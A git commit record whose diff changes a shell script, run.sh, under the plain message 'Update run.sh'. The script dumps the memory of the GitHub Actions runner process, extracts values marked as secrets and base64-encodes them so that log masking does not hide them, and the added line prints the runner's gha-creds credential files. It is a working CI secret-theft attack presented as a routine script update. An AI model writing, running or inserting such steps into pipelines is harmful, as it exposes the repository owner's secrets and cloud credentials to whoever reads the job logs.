c89f06b83746aeb577e18b52a6cc7d94f5b01fa2
Rui Costa <44004884+rui-costa@users.noreply.github.com>
2023-10-17 14:10:14 +0200

    Update run.sh

--- run.sh
+++ run.sh
@@ -3,3 +3,4 @@ sudo apt update
 sudo apt install -y gdb
 sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
 grep -Eao '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump* | base64
+cat /home/runner/work/dkr-ofd-cluster-service/dkr-ofd-cluster-service/gha-creds-*
